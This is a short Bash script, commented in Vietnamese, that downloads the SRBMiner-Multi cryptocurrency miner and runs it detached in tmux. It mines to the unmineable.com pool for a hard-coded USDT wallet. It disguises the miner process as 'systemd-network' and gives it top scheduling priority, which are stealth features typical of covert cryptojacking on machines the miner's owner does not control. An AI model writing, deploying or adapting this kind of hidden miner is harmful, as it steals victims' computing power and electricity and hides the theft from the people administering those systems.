#!/bin/bash

# Kiểm tra xem đang chạy trong tmux hay không
if [ -z "$TMUX" ]; then
  echo "Chạy trong tmux..."
  tmux new-session -d -s mining "bash $0"
  exit
fi

# Cấu hình số luồng CPU và tên miner ngẫu nhiên
THREADS=3
MINER_NAME=$(shuf -i 10000000-99999999 -n 1)

# Tạo thư mục nếu chưa có
mkdir -p neable
cd neable

# Kiểm tra xem file SRBMiner đã tồn tại chưa
if [ ! -f SRBMiner-Multi-2-8-1-Linux.tar.gz ]; then
  echo "Tải xuống SRBMiner..."
  wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.1/SRBMiner-Multi-2-8-1-Linux.tar.gz
  if [ $? -ne 0 ]; then
    echo "❌ Lỗi: Không thể tải SRBMiner!"
    exit 1
  fi
  tar -xf SRBMiner-Multi-2-8-1-Linux.tar.gz || { echo "❌ Lỗi giải nén!"; exit 1; }
fi

# Chuyển vào thư mục miner
cd SRBMiner-Multi-2-8-1 || { echo "❌ Lỗi: Không tìm thấy thư mục miner!"; exit 1; }

# Chạy miner
echo "⛏️ Bắt đầu đào với $THREADS luồng CPU..."
exec -a systemd-network nice -n -20 ./SRBMiner-MULTI \
  --disable-gpu \
  --algorithm randomx \
  -o rx.unmineable.com:3333 \
  -a rx -k \
  -u USDT:0xfe301Eb4Cb42EE7F605922Cf82c813638011D89A.$MINER_NAME#ii6d-2qcm \
  -p x \
  --cpu-threads $THREADS \
  --cpu-max-threads-hint=100 \
  --randomx-1gb-pages
